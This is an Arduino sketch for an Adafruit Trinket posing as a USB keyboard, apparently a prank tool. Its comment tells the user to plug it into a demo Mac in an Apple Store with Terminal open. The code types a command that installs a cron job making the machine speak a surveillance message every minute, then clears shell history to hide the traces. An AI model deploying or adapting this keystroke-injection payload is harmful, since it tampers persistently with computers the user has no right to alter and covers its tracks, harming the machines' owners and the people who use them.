/*

  Hardware: Adafruit Trinket 5V :
  https://www.adafruit.com/product/1501

  Software: Adafruit Trinket Keyboard
  https://github.com/adafruit/Adafruit-Trinket-USB/


  How to :
  Upload this code to your Trinket
  Go to an AppleStore / Apple retailer
  Pick a machine
  Check the sound is enabled (or even better connect to a Bluetooth speaker nearby)
  Pump up the volume
  Open Terminal and plug-in the USB
  Close the Terminal
  Move away
  Enjoy


*/

#include <TrinketKeyboard.h>


void setup() {
  TrinketKeyboard.begin();

}

void loop()
{
  TrinketKeyboard.poll();
  
  // Add a new cron job
  // English version
  // TrinketKeyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Whisper Apple is watching you\")| crontab -");
  // French version
  TrinketKeyboard.println("   (crontab -l 2>/dev/null; echo \"* * * * * say -v Thomas Vous aites observer. Apple aipie vos faits et gestes\")| crontab -");

  // Clean after yourself
  TrinketKeyboard.println("  history -c");
  TrinketKeyboard.println("  reset");

  // Exit Terminal
  // TODO : find keycode for Command + Q

  // Gives you some time to unplug the device before it types again
  delay(30000);

}
